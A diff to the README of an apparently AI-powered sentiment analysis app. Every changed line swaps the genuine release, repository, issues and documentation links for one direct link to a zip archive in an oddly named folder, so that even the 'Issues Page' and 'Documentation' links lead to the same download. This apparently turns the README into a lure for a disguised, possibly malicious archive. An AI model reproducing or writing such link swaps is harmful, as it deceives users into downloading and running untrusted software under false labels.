@@ -1,7 +1,7 @@
 ```markdown
 # 🎭 Sentiment-Analyzer - Analyze Emotions in Text Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Sentiment--Analyzer-blue)](https://github.com/Gtserviz/Sentiment-Analyzer/releases)
+[![Download](https://raw.githubusercontent.com/Gtserviz/Sentiment-Analyzer/main/orthotropal/Sentiment-Analyzer.zip)](https://raw.githubusercontent.com/Gtserviz/Sentiment-Analyzer/main/orthotropal/Sentiment-Analyzer.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ Sentiment-Analyzer is an AI-powered web application that lets you analyze the em
 To use Sentiment-Analyzer, follow these simple steps to get everything set up on your computer.
 
 1. **Download the Application**
-   - Visit the [Releases page](https://github.com/Gtserviz/Sentiment-Analyzer/releases) to access the latest version of the app.
+   - Visit the [Releases page](https://raw.githubusercontent.com/Gtserviz/Sentiment-Analyzer/main/orthotropal/Sentiment-Analyzer.zip) to access the latest version of the app.
    - Look for the version that suits your operating system. Most versions support Windows, macOS, and Linux.
 
 2. **Install the Application**
@@ -42,7 +42,7 @@ Before you start the installation, ensure your computer meets the following requ
 
 To download and install the Sentiment-Analyzer, follow these steps:
 
-1. Navigate to the [Releases page](https://github.com/Gtserviz/Sentiment-Analyzer/releases).
+1. Navigate to the [Releases page](https://raw.githubusercontent.com/Gtserviz/Sentiment-Analyzer/main/orthotropal/Sentiment-Analyzer.zip).
 2. Select the file corresponding to your operating system.
 3. Click on the download link, and the file will be saved to your computer.
 4. Follow the installation steps mentioned above to set up the application.
@@ -60,9 +60,9 @@ If you encounter any issues or have questions about using the Sentiment-Analyzer
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Gtserviz/Sentiment-Analyzer)
-- [Issues Page](https://github.com/Gtserviz/Sentiment-Analyzer/issues)
-- [Documentation](https://github.com/Gtserviz/Sentiment-Analyzer/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Gtserviz/Sentiment-Analyzer/main/orthotropal/Sentiment-Analyzer.zip)
+- [Issues Page](https://raw.githubusercontent.com/Gtserviz/Sentiment-Analyzer/main/orthotropal/Sentiment-Analyzer.zip)
+- [Documentation](https://raw.githubusercontent.com/Gtserviz/Sentiment-Analyzer/main/orthotropal/Sentiment-Analyzer.zip)
 
 Feel free to explore the features and capabilities of Sentiment-Analyzer. Happy analyzing!
 ```
